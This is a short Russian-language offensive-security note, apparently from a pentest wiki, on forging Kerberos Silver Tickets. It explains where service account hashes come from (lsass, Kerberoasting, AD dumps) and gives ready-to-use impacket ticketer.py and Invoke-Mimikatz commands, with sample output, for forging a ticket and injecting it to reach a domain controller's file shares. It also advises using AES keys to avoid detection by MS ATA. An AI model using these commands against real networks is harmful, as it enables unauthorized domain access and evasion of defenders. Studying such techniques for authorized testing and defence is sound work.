# Silver Ticket

## About

Silver Ticket – TGS тикет, который мы выписали сами.

Зашифрован и подписан NTLM-хешом service account'а (Golden ticket подписан хешом krbtgt) сервиса, запущенного из-под этого аккаунта. Сервисы редко проверяют PAC (Privileged Attribute Certificate).&#x20;

TGS может быть получен:

* из lsass процесса, где пользователь авторизован
* Kerberoast
* дамп базы данных AD
* ...

## Create Silver Ticket (from key)

* mimikatz kerberos::golden
* impacket ticketer.py

Create Golden Ticket with ticketer.py (как-то подобным образом и Silver Ticket получаем)

```
$ ticketer.py -domain-sid S-1-5-21-1372086773-2238746523-2939299801 -domain contoso.local Administrator -aes 5249e3cf829c979959286c0ee145b7e6b8b8589287bea3c83dd5c9488c40f162
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for contoso.local/Administrator
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncAsRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncASRepPart
[*] Saving ticket in Administrator.ccache
```

По возможности используем AES, чтобы не детектили нас через MS ATA.

## Examples

Используем хеш от учетной записи компьютера DC. Команда ниже предоставляет доступ к общим ресурсам (shares) в DC:

```
Invoke-Mimikatz -Command '"kerberos::golden /domain:my.domain.local /sid:S-1-5-21-3270384115-3177237293-604223748 /target:my-dc.my.domain.local /service:cifs /rc4:2adf794a4f1ba75fa56fb5b2f6393bc3 /id:501 /user:Administrator /ptt"'
```
